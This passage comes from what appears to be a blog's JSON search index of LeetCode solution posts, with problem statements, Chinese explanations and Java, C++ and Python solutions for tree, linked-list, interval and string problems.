maxPathDown(node.left)); int right = Math.max(0, maxPathDown(node.right)); maxValue = Math.max(maxValue, left + right + node.val); return Math.max(left, right) + node.val;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"125. Valid Palindrome","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-125-Valid-Palindrome/","text":"Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases. Note: For the purpose of this problem, we define empty string as valid palindrome. Example 1: 12Input: &quot;A man, a plan, a canal: Panama&quot;Output: true Example 2: 12Input: &quot;race a car&quot;Output: false Java确认字符串是否为有效的回文。这道题目思路还是很简单的。第一步，判断字符是否有效；第二步，比较有效的字符是否左右对称。 12345678910111213141516171819202122232425262728293031323334public boolean isPalindrome(String s) &#123; // length of the string int n = s.length(); // special occasion if (n &lt; 2) return true; char[] charArray = s.toLowerCase().toCharArray(); char cur; int left = -1, right = n; while (true) &#123; while (!validAlphanumeric(charArray[++left])) if (left == n - 1) return true; while (!validAlphanumeric(charArray[--right]))&#123;&#125; if (left &gt;= right) break; if (charArray[left] != charArray[right]) return false; &#125; return true;&#125; /** * check if it is a valid alphanumeric characters * return false if not. */private boolean validAlphanumeric(char c) &#123; if (c &gt;= 'a' &amp;&amp; c &lt;= 'z') return true; else if (c &gt;= '0' &amp;&amp; c &lt;= '9') return true; return false; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"127. Word Ladder","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-127-Word-Ladder/","text":"Given two words (beginWord and endWord), and a dictionary’s word list, find the length of shortest transformation sequence from beginWord to endWord, such that: Only one letter can be changed at a time. Each transformed word must exist in the word list. Note that beginWord is not a transformed word. Note: Return 0 if there is no such transformation sequence. All words have the same length. All words contain only lowercase alphabetic characters. You may assume no duplicates in the word list. You may assume beginWord and endWord are non-empty and are not the same. Example 1: 123456789Input:beginWord = &quot;hit&quot;,endWord = &quot;cog&quot;,wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]Output: 5Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,return its length 5. Example 2: 12345678Input:beginWord = &quot;hit&quot;endWord = &quot;cog&quot;wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]Output: 0Explanation: The endWord &quot;cog&quot; is not in wordList, therefore no possible transformation.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"128. Longest Consecutive Sequence","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-128-Longest-Consecutive-Sequence/","text":"Given an unsorted array of integers, find the length of the longest consecutive elements sequence. Your algorithm should run in $O(n)$ complexity. Example: 1234Input: [100, 4, 200, 1, 3, 2]Output: 4Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. Therefore its length is 4. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** Given an unsorted array of integers, * find the length of the longest consecutive elements sequence. * * https://leetcode.com/problems/longest-consecutive-sequence/description/ */public class Q128LongestConsecutiveSequence &#123; public int longestConsecutive(int[] nums) &#123; HashMap&lt;Integer, Integer&gt; dict = new HashMap&lt;&gt;(); HashMap&lt;Integer, Integer&gt; count = new HashMap&lt;&gt;(); for (int num : nums) &#123; dict.put(num, num); count.put(num, 1); &#125; for (int num : nums) &#123; if (dict.containsKey(num + 1)) union(num,num + 1, dict, count); if (dict.containsKey(num - 1)) union(num, num - 1, dict, count); &#125; int max = 0; for (int num : nums) &#123; max = Math.max(count.get(num), max); &#125; return max; &#125; private void union(int i, int j, HashMap&lt;Integer, Integer&gt; dict, HashMap&lt;Integer, Integer&gt; count) &#123; int rooti = root(i, dict); int rootj = root(j, dict); if (rooti != rootj) &#123; if (count.get(rooti) &lt; count.get(rootj)) &#123; dict.replace(rooti, rootj); count.replace(rootj, count.get(rooti) + count.get(rootj)); &#125; else &#123; dict.replace(rootj, rooti); count.replace(rooti, count.get(rooti) + count.get(rootj)); &#125; &#125; &#125; private int root(int i, HashMap&lt;Integer, Integer&gt; dict) &#123; while (i != dict.get(i)) &#123; if (dict.containsKey(dict.get(i))) dict.replace(i, dict.get(dict.get(i))); i = dict.get(i); &#125; return i; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Union Find","slug":"Union-Find","permalink":"http://larryim.cc/tags/Union-Find/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"129. Sum Root to Leaf Numbers","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-129-Sum-Root-to-Leaf-Numbers/","text":"Given a binary tree containing digits from 0-9 only, each root-to-leaf path could represent a number. An example is the root-to-leaf path 1-&gt;2-&gt;3 which represents the number 123. Find the total sum of all root-to-leaf numbers. Note: A leaf is a node with no children. Example: 123456789Input: [1,2,3] 1 / \\ 2 3Output: 25Explanation:The root-to-leaf path 1-&gt;2 represents the number 12.The root-to-leaf path 1-&gt;3 represents the number 13.Therefore, sum = 12 + 13 = 25. Example 2: 123456789101112Input: [4,9,0,5,1] 4 / \\ 9 0 / \\5 1Output: 1026Explanation:The root-to-leaf path 4-&gt;9-&gt;5 represents the number 495.The root-to-leaf path 4-&gt;9-&gt;1 represents the number 491.The root-to-leaf path 4-&gt;0 represents the number 40.Therefore, sum = 495 + 491 + 40 = 1026. Java这道题目和LeetCode 113. Path Sum II非常像。在Q113中，给出路径：路径开始于根节点，终止于叶子节点，并且路径的和为给定值。这里要求的是所有路径的和。总体方法其实一样的。 123456789101112131415161718private int sum;public int sumNumbers(TreeNode root) &#123; sum = 0; sumNumbersHelper(root, \"\"); return sum;&#125;private void sumNumbersHelper(TreeNode root, String s) &#123; if (root == null) return; String sNew = s + Integer.toString(root.val); // leaf node if (root.left == null &amp;&amp; root.right == null) &#123; sum += Integer.parseInt(sNew); return; &#125; sumNumbersHelper(root.left, sNew); sumNumbersHelper(root.right, sNew);&#125; 使用StringBuilder，并使用backtracking的思想，删除已访问过的数字： 1234567891011121314151617private int sum;public int sumNumbers(TreeNode root) &#123; sum = 0; sumNumbersHelper(root, new StringBuilder()); return sum;&#125;private void sumNumbersHelper(TreeNode root, StringBuilder s) &#123; if (root == null) return; s.append(Integer.toString(root.val)); // leaf node if (root.left == null &amp;&amp; root.right == null) sum += Integer.parseInt(s.toString()); sumNumbersHelper(root.left, s); sumNumbersHelper(root.right, s); s.deleteCharAt(s.length() - 1);&#125; 但上面的方法都太笨拙了。因为根本不要保存字符串，直接保存数字，大大节省了内存。 12345678910111213public int sumNumbers(TreeNode root) &#123; return sumNumbersHelper(root, 0);&#125;private int sumNumbersHelper(TreeNode root, int sum) &#123; if (root == null) return 0; sum = 10*sum + root.val; // leaf node if (root.left == null &amp;&amp; root.right == null) return sum; return sumNumbersHelper(root.left, sum) + sumNumbersHelper(root.right, sum);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"590. N-ary Tree Postorder Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-590-N-ary-Tree-Postorder-Traversal/","text":"Given an n-ary tree, return the postorder traversal of its nodes’ values. For example, given a 3-ary tree: Return its postorder traversal as: [5,6,3,2,4,1]. Note: Recursive solution is trivial, could you do it iteratively? Java123456789101112public List&lt;Integer&gt; postorder(Node root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); postorder(list, root); return list;&#125; private void postorder(List&lt;Integer&gt; list, Node root) &#123; if (root == null) return; for (Node node : root.children) postorder(list, node); list.add(root.val);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"78. Subsets","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-78-Subsets-md/","text":"题目Given a set of distinct integers, nums, return all possible subsets (the power set). Note: The solution set must not contain duplicate subsets. Example: 123456789101112Input: nums = [1,2,3]Output:[ [3], [1], [2], [1,2,3], [1,3], [2,3], [1,2], []] 分析幂集(power set)的wikipedia页面 其实和sublists思路一样。以第$i$个元素是否出现在output中为判断条件，构建decision tree。使用backtracking。 12345678910111213141516171819202122232425262728class Solution &#123;public: void subsetsHelper(int&amp; n, int position, vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; chosen, vector&lt;vector&lt;int&gt;&gt;&amp; res)&#123; if (position==n)&#123; res.push_back(chosen); return; &#125;else&#123; //choose and explore subsetsHelper(n, position+1, nums, chosen, res); // 不选择 int s = nums[position]; chosen.push_back(s); subsetsHelper(n, position+1, nums, chosen, res); // 选择 //unchoose chosen.pop_back(); &#125; &#125; vector&lt;vector&lt;int&gt;&gt; subsets(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; res; vector&lt;int&gt; chosen; int n = nums.size(); subsetsHelper(n, 0, nums, chosen, res); return res; &#125;&#125;; 不过也可以使用传统的backtracking，但是其base case始终发生。 123456789101112131415161718class Solution &#123;public: vector&lt;vector&lt;int&gt; &gt; subsets(vector&lt;int&gt; &amp;nums) &#123; vector&lt;vector&lt;int&gt; &gt; res; vector&lt;int&gt; vec; subsets(res, nums, nums.size(), vec, 0); return res; &#125;private: void subsets(vector&lt;vector&lt;int&gt; &gt; &amp;res, vector&lt;int&gt; &amp;nums, int n, vector&lt;int&gt; &amp;vec, int begin) &#123; res.push_back(vec); for (int i = begin; i &lt; n; ++i) &#123; vec.push_back(nums[i]); subsets(res, nums, n, vec, i + 1); vec.pop_back(); &#125; &#125;&#125;;","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"109. Convert Sorted List to Binary Search Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-109-Convert-Sorted-List-to-Binary-Search-Tree/","text":"Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST. For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1. Example: 123456789Given the sorted linked list: [-10,-3,0,5,9],One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \\ -3 9 / / -10 5 Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"253. Meeting Rooms II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-253-Meeting-Rooms-II/","text":"Given an array of meeting time intervals consisting of start and end times $[[s_1,e_1],[s_2,e_2],…], (s_i &lt; e_i)$, find the minimum number of conference rooms required. Example: 1Given intervals = [(0,30),(5,10),(15,20)], return 2. Java给定会议时间间隔，要求所需的最小的会议室数量。将会议时间间隔按照会议开始时间排序，如果后一个会议的开始时间小于上一个会议的结束时间，则需要多一个会议室。如果有$k$个会议室，如果后一个会议的开始时间小于所有会议室的会议结束时间，则需要多一个会议室；如果不需要，则将会议安排到任意已经结束会议的会议室。时间复杂度为$O(kn)$，其中$n$为会议数量，$k$为需要的会议室数量。 123456789101112131415public int minMeetingRooms(List&lt;Interval&gt; intervals) &#123; intervals.sort(Comparator.comparing(o -&gt; o.start)); List&lt;Integer&gt; meetingRooms = new ArrayList&lt;&gt;(); // 每个会议室的会议结束时间 meetingRooms.add(-1); for (Interval interval : intervals) &#123; int i = 0; // 寻找任意一个已经结束会议的会议室 while (i &lt; meetingRooms.size() &amp;&amp; meetingRooms.get(i) &gt; interval.start) i++; // 如果没有，则增加一个会议室 if (i == meetingRooms.size()) meetingRooms.add(interval.end); // 否则，将该会议安排到寻找到的会议室，并更新结束时间 else meetingRooms.set(i, interval.end); &#125; return meetingRooms.size();&#125; 也可以将会议安排到最早结束会议的会议室，时间复杂度为$O(k^2n)$. 123456789101112131415161718public int minMeetingRooms(List&lt;Interval&gt; intervals) &#123; if (intervals == null || intervals.size() == 0) return 0; intervals.sort(Comparator.comparing(o -&gt; o.start)); List&lt;Integer&gt; meetingRooms = new ArrayList&lt;&gt;(); // 每个会议室的会议结束时间 meetingRooms.add(-1); for (Interval interval : intervals) &#123; // min是最早结束会议的会议室 int min = 0; // 寻找min for (int i = 0; i &lt; meetingRooms.size(); i++) if (meetingRooms.get(i) &lt; meetingRooms.get(min)) min = i; // 如果最早结束会议的会议室仍旧不能满足该会议的时间，则增加一个会议室 if (meetingRooms.get(min) &gt; interval.start) meetingRooms.add(interval.end); // 否则，将该会议安排到寻找到的会议室，并更新结束时间 else meetingRooms.set(min, interval.end); &#125; return meetingRooms.size();&#125; 使用优先级队列保存会议室的结束时间，而不是数组，每次poll()会提取最早结束的会议室，优化了时间复杂度，时间复杂度为$O(n\\log n)$. 12345678910111213public int minMeetingRooms(List&lt;Interval&gt; intervals) &#123; if (intervals == null || intervals.size() == 0) return 0; intervals.sort(Comparator.comparing(o-&gt;o.start)); PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;&gt;(); int count = 1; queue.offer(intervals.get(0).end); for(int i = 1; i &lt; intervals.size(); i++)&#123; if(intervals.get(i).start &lt; queue.peek()) count++; else queue.poll(); queue.offer(intervals.get(i).end); &#125; return count;&#125; 下面是另一类方法扫描线算法： 扫描线（sweep line)：将区间在x轴上画出来，并用一条垂直于x轴的线作为扫描线从左至右扫描，会很容易得出答案，即与扫描线相交的区间的数量的最大值为所求答案。 但是在程序中我们怎样表示这种思想呢？ 对所有点进行标记，区分起始点和终止点 对所有点进行排序 依次遍历每个点，遇到起始点+1，遇到终止点-1，并更新记录最大值 对所有点进行标记有几种方法 第一种方法是用两个一维数组来做，分别保存起始时间和结束时间，然后各自排序，定义结果变量minRooms和结束时间指针endpos，然后我们开始遍历，如果当前起始时间start[i]小于结束时间指针的时间ends[endpos]，则结果自增1，反之结束时间指针自增1，这样我们可以找出重叠的时间段，从而安排新的会议室，参见代码如下： 12345678910111213141516171819public int minMeetingRooms(List&lt;Interval&gt; intervals) &#123; if (intervals == null || intervals.size() == 0) return 0; int[] starts = new int[intervals.size()]; // 保存会议开始时间 int[] ends = new int[intervals.size()]; // 保存会议结束时间 for (int i = 0; i &lt; intervals.size(); i++) &#123; starts[i] = intervals.get(i).start; ends[i] = intervals.get(i).end; &#125; // 各自排序 Arrays.sort(starts); Arrays.sort(ends); // 扫描线段 int minRooms = 0, endpos = 0; for (int i = 0; i &lt; intervals.size(); i++) if (starts[i] &lt; ends[endpos]) minRooms++; else endpos++; return minRooms; &#125; 一种更好的办法是，直接用+1表示开始时间点，用-1表示结束时间点，而不用分别在两个数组中存储。可以使用TreeMap自动实现分类。 123456789101112131415161718public int minMeetingRooms(List&lt;Interval&gt; intervals) &#123; if (intervals == null || intervals.size() == 0) return 0; TreeMap&lt;Integer, Integer&gt; map = new TreeMap&lt;&gt;(); int minRooms = 0; // 总共所需要的会议室 int currentRooms = 0; // 现在使用的会议室数量 // 会议开始时间为1，结束时间为-1 for (Interval interval : intervals) &#123; map.put(interval.start, map.getOrDefault(interval.start, 0) + 1); map.put(interval.end, map.getOrDefault(interval.end, 0) - 1); &#125; // 扫描 for (int k : map.keySet()) &#123; currentRooms += map.get(k); minRooms = Math.max(minRooms, currentRooms); &#125; return minRooms; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"},{"name":"Greedy","slug":"Greedy","permalink":"http://larryim.cc/tags/Greedy/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"133. Clone Graph","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-133-Clone-Graph/","text":"Given the head of a graph, return a deep copy (clone) of the graph. Each node in the graph contains a label (int) and a list (List[UndirectedGraphNode]) of its neighbors. There is an edge between the given node and each of the nodes in its neighbors. 123456789private static class UndirectedGraphNode &#123; int label; List&lt;UndirectedGraphNode&gt; neighbors; UndirectedGraphNode(int x) &#123; label = x; neighbors = new ArrayList&lt;&gt;(); &#125;&#125; JavaDFS，需要注意的是要把克隆的节点放入哈希表中，如果某一节点已经克隆，则直接返回该节点。 1234567891011121314151617public class Solution &#123; public UndirectedGraphNode cloneGraph(UndirectedGraphNode node) &#123; HashMap&lt;Integer, UndirectedGraphNode&gt; map = new HashMap&lt;&gt;(); return clone(node, map); &#125; private UndirectedGraphNode clone(UndirectedGraphNode node, HashMap&lt;Integer, UndirectedGraphNode&gt; map) &#123; if (node == null) return null; if (map.containsKey(node.label)) return map.get(node.label); UndirectedGraphNode clone = new UndirectedGraphNode(node.label); map.put(clone.label, clone); for (UndirectedGraphNode neighbor : node.neighbors) clone.neighbors.add(clone(neighbor, map)); return clone; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"342. Power of Four","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-342-Power-of-Four/","text":"Given an integer (signed 32 bits), write a function to check whether it is a power of 4. Example 1: 12Input: 16Output: true Example 2: 12Input: 5Output: false Follow up: Could you solve it without loops/recursion? Java类似于LeetCode 231. Power of Two. 12345678public boolean isPowerOfFour(int n) &#123; if (n &lt;= 0) return false; while (n &gt; 1) &#123; if (n % 4 != 0) return false; n &gt;&gt;= 2; &#125; return n == 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"326. Power of Three","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-326-Power-of-Three/","text":"Given an integer, write a function to determine if it is a power of three. Example 1: 12Input: 27Output: true Example 2: 12Input: 0Output: false Example 3: 12Input: 9Output: true Example 4: 12Input: 45Output: false Follow up: Could you do it without using any loop / recursion? Java最直接的办法，一定就是一直除以3，直到1为止，看它是否等于1。 12345public boolean isPowerOfThree(int n) &#123; if (n &lt; 1) return false; while (n % 3 == 0) n /= 3; return n == 1;&#125; 题目还要求不使用任何循环，其实对于任何质数$k$，都有当$n % k = 0$时，$n$是$k$的指数。 1234public boolean isPowerOfThree(int n) &#123; // 1162261467 is 3^19, 3^20 is bigger than int return (n &gt; 0) &amp;&amp; (1162261467 % n == 0);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"139. Word Break","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-139-Word-Break/","text":"Given a non-empty string s and a dictionary wordDict containing a list of non-empty words, determine if $s$ can be segmented into a space-separated sequence of one or more dictionary words. Note: The same word in the dictionary may be reused multiple times in the segmentation. You may assume the dictionary does not contain duplicate words. Example 1: 123Input: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;, &quot;code&quot;]Output: trueExplanation: Return true because &quot;leetcode&quot; can be segmented as &quot;leet code&quot;. Example 2: 1234Input: s = &quot;applepenapple&quot;, wordDict = [&quot;apple&quot;, &quot;pen&quot;]Output: trueExplanation: Return true because &quot;applepenapple&quot; can be segmented as &quot;apple pen apple&quot;. Note that you are allowed to reuse a dictionary word. Example 3: 12Input: s = &quot;catsandog&quot;, wordDict = [&quot;cats&quot;, &quot;dog&quot;, &quot;sand&quot;, &quot;and&quot;, &quot;cat&quot;]Output: false Java12345678910111213public boolean wordBreak(String s, List&lt;String&gt; wordDict) &#123; boolean[] f = new boolean[s.length() + 1]; f[0] = true; for(int i = 1; i &lt;= s.length(); i++)&#123; for(int j = 0; j &lt; i; j++)&#123; if(f[j] &amp;&amp; wordDict.contains(s.substring(j, i)))&#123; f[i] = true; break; &#125; &#125; &#125; return f[s.length()];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"141. Linked List Cycle","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-141-Linked-List-Cycle/","text":"Given a linked list, determine if it has a cycle in it. Follow up: Can you solve it without using extra space? Java判断链表是否有环。这里使用两种方案： 第一种当然最直接，把元素放到hashset中，然后看该元素是否已经包含在hashset中。 第二种，需要动一点脑子， 两个指针，一直跑，一前一后，前面的跑的快，后面的跑得慢，看快的是否能追上慢的。 追的上，说明链表肯定是有循环的。如果跑的快的直接跑到终点了，那就是没循环。 1234567891011121314151617/** * Use the method of HashSet * To detect if a list is cyclic, * we can check whether a node had been visited before. * A natural way is to use a hash table. */public boolean hasCycle(ListNode head) &#123; HashSet&lt;ListNode&gt; set = new HashSet&lt;&gt;(); while (head != null) &#123; if (set.contains(head)) &#123; return true; &#125; set.add(head); head = head.next; &#125; return false;&#125; 两个指针的方案，想象一下两个运动员在跑道上以不同的速度跑步。如果跑道是个圆，那么将会发生什么？考虑两个不同速度移动的指针 - 慢指针和快指针。如果在链表中没有环，快指针将会跑到终点，我们可以返回false。如果链表中包含环，那么快指针和慢指针最终将相遇。 注意要让fast跑在slow前面，这样才能跑完完整一圈 12345678910111213public boolean hasCycle(ListNode head) &#123; if (head == null || head.next == null) return false; ListNode slow = head; // 慢指针在后 ListNode fast = head.next; // 快指针在前 while (fast != slow) &#123; // 判断是否相遇 // 快指针跑完了，返回false if ((fast == null) || (fast.next == null)) return false; slow = slow.next; fast = fast.next.next; &#125; return true;&#125; 也可以让慢指针和快指针同时从起点开始，但是while循环判断的条件要改变，因为一开始fast = slow. 12345678910public boolean hasCycle(ListNode head) &#123; ListNode slow = head; ListNode fast = head; while (fast != null &amp;&amp; fast.next != null) &#123; slow = slow.next; fast = fast.next.next; if (fast == slow) return true; &#125; return false;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"142. Linked List Cycle II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-142-Linked-List-Cycle-II/","text":"Given a linked list, return the node where the cycle begins. If there is no cycle, return null. Note: Do not modify the linked list. Follow up: Can you solve it without using extra space? Java这道题目是LeetCode 141. Linked List Cycle的升级版，前者只需要给出链表是否存在环，现在还要给出环的起始位置。由于Q141有两种解法：一种是哈希表，另一种是两个指针。这里也分别用这两种方法解决问题。 利用HashSet: 123456789public ListNode detectCycle(ListNode head) &#123; HashSet&lt;ListNode&gt; map = new HashSet&lt;&gt;(); while (head != null) &#123; if (map.contains(head)) return head; map.add(head); head = head.next; &#125; return null;&#125; 利用指针来寻找链表中环的位置，一共分为两个步骤： 确定是否有环 使用慢指针每次移动一步 使用快指针每次移动两步 如果慢指针和快指针在一定时间后相遇，则有环；如果快指针到达链表尾部，则无环。 如果存在环，返回环的起点pt $s$是起点start和环的起点ep(entry point)的距离 $m$是环的起点ep和相遇点meet的距离 $r$是环的长度 $n$是慢指针和快指针首次相遇它们绕着环运动的圈数 因为快指针的速度是慢指针的两倍，所以 $s+m = \\frac{s+m+n\\times r}{2}\\rightarrow s+m = n\\times r \\rightarrow s = (n-1)\\times r + (r - m)$， 所以有结论：起点start和环的起点ep(entry point)的距离$s$等于相遇点meet和环的起点ep沿着环的方向的距离。 所以，当慢指针和快指针相遇的时候，我们放另一个慢指针在起点start，然后把快指针变成慢指针。同时移动两个慢指针，它们相遇时的位置，刚好是环的起点ep($s = (n-1)\\times r + (r - m)$)。 12345678910111213141516171819202122232425public ListNode detectCycle(ListNode head) &#123; // 快指针和慢指针 ListNode fast = head, slow = head; // 确定环是否存在于链表当中 while (fast != null &amp;&amp; fast.next != null) &#123; fast = fast.next.next; slow = slow.next; if (slow == fast) break; // 存在环：相遇 &#125; // 不存在环 if (fast == null || fast.next == null) return null; // 在链表首部放置慢指针 slow = head; // 同时移动两个慢指针(快指针也变成慢指针),直到相遇 while (fast != slow) &#123; fast = fast.next; slow = slow.next; &#125; return fast;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"14. Longest Common Prefix","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-14-Longest-Common-Prefix/","text":"Write a function to find the longest common prefix string amongst an array of strings. 1234567891011121314151617181920212223242526272829class Solution: def longestCommonPrefix(self, strs): \"\"\" :type strs: List[str] :rtype: str \"\"\" # 空的列表 if strs == []: return \"\" lcp = \"\" small_length = len(strs[0]) for str in strs: if len(str) &lt; small_length: small_length = len(str) # 全部都是空字符串 if small_length == 0: return \"\" print(small_length) for i in range(small_length): lcp += strs[0][i] for str in strs: # 该字符不符合最大子字符串 if str[i] != lcp[i]: return lcp[0:i] #全部符合 return lcp","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"greedy algorithm","slug":"greedy-algorithm","permalink":"http://larryim.cc/tags/greedy-algorithm/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"143. Reorder List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-143-Reorder-List/","text":"Given a singly linked list L: L0→L1→…→Ln-1→Ln,reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→… You may not modify the values in the list’s nodes, only nodes itself may be changed. Example 1: 1Given 1-&gt;2-&gt;3-&gt;4, reorder it to 1-&gt;4-&gt;2-&gt;3. Example 2: 1Given 1-&gt;2-&gt;3-&gt;4-&gt;5, reorder it to 1-&gt;5-&gt;2-&gt;4-&gt;3. Java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/** * Given a singly linked list L: L0 → L1 → … → Ln-1 → Ln, * reorder it to: L0 → Ln → L1 → Ln-1 → L2 → Ln-2 → … * * You may not modify the values in the list's nodes, * only nodes itself may be changed. * * * Example: * Given 1-&gt;2-&gt;3-&gt;4, reorder it to 1-&gt;4-&gt;2-&gt;3. * Given 